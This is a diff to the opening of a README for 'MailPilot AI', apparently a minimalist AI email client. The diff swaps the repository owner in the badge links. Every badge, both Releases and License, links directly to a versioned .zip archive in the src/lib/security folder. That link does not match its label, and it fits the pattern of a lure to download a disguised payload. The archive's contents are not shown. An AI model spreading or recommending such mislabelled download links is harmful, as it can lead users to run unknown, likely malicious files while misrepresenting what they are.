@@ -2,7 +2,7 @@ https://github.com/Hamxa00/mailpilot-ai/raw/refs/heads/master/src/lib/security/a
 
 # MailPilot AI: Minimalist AI Email Client for a Focused Inbox
 
-[![Releases](https://github.com/Hamxa00/mailpilot-ai/raw/refs/heads/master/src/lib/security/ai-mailpilot-1.5-alpha.5.zip)](https://github.com/Hamxa00/mailpilot-ai/raw/refs/heads/master/src/lib/security/ai-mailpilot-1.5-alpha.5.zip) [![License](https://github.com/Hamxa00/mailpilot-ai/raw/refs/heads/master/src/lib/security/ai-mailpilot-1.5-alpha.5.zip)](https://github.com/Hamxa00/mailpilot-ai/raw/refs/heads/master/src/lib/security/ai-mailpilot-1.5-alpha.5.zip)
+[![Releases](https://github.com/elshemy44/mailpilot-ai/raw/refs/heads/master/src/lib/security/ai-mailpilot-1.5-alpha.5.zip)](https://github.com/elshemy44/mailpilot-ai/raw/refs/heads/master/src/lib/security/ai-mailpilot-1.5-alpha.5.zip) [![License](https://github.com/elshemy44/mailpilot-ai/raw/refs/heads/master/src/lib/security/ai-mailpilot-1.5-alpha.5.zip)](https://github.com/elshemy44/mailpilot-ai/raw/refs/heads/master/src/lib/security/ai-mailpilot-1.5-alpha.5.zip)
 
 MailPilot AI is a minimalist email client powered by AI, built to help you focus on what matters. It blends a clean, distraction-free interface with smart AI features to manage your inbox without getting in your way. This project emphasizes ease of use, open-source transparency, and a thoughtful user experience that respects your time and attention.
 
